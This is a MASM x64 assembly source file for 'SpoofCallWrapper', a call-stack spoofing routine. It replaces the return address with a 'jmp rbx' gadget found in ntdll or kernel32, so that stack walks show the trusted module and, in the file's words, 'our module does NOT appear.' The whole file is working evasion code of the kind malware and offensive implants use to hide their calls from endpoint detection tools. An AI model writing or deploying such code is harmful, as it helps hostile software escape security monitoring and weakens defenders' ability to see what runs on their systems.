;
;  StackSpoof.asm — MASM x64
;  SpoofCall4 wrapper — replaces return address with trusted module gadget
;
;  Mechanism:
;    1. Save real return address in rbx
;    2. Overwrite [rsp] with FF E3 gadget address from ntdll/kernel32
;    3. Reshuffle args: funcPtr→rax, gadget→gone, arg1→rcx, arg2→rdx, etc.
;    4. JMP to target function (return address already set on stack)
;    5. Target returns → goes to FF E3 gadget in trusted module
;    6. FF E3 (jmp rbx) → jumps to our real return address
;
;  Call chain seen by RtlWalkFrameChain:
;    target_function ← FF_E3_gadget_in_ntdll ← ...
;  Our module does NOT appear.
;
;  Limitation: rbx is NOT preserved (holds real return address).
;  The C++ wrapper must not depend on rbx across SpoofCallWrapper.
;

.CODE

; ═══════════════════════════════════════════════════════════
; SpoofCall4(funcPtr, spoofGadget, arg1, arg2, arg3, arg4)
;   rcx = function pointer
;   rdx = spoof gadget address (FF E3 in trusted module)
;   r8  = arg1
;   r9  = arg2
;   [rsp+28h] = arg3
;   [rsp+30h] = arg4
; ═══════════════════════════════════════════════════════════
SpoofCallWrapper PROC PUBLIC
    ; Save real return address in rbx (for FF E3 chain back to caller)
    mov rbx, [rsp]

    ; Overwrite return address with spoof gadget from trusted module
    mov [rsp], rdx

    ; Reshuffle args: move function args into calling convention positions
    mov rax, rcx            ; save funcPtr in rax (volatile, safe)
    mov rcx, r8             ; rcx = arg1
    mov rdx, r9             ; rdx = arg2
    mov r8, [rsp+28h]       ; r8 = arg3
    mov r9, [rsp+30h]       ; r9 = arg4

    ; JMP to target — return address on stack is the spoof gadget
    ; Target will "return" to FF E3 in ntdll, which does jmp rbx → our caller
    jmp rax
SpoofCallWrapper ENDP

END
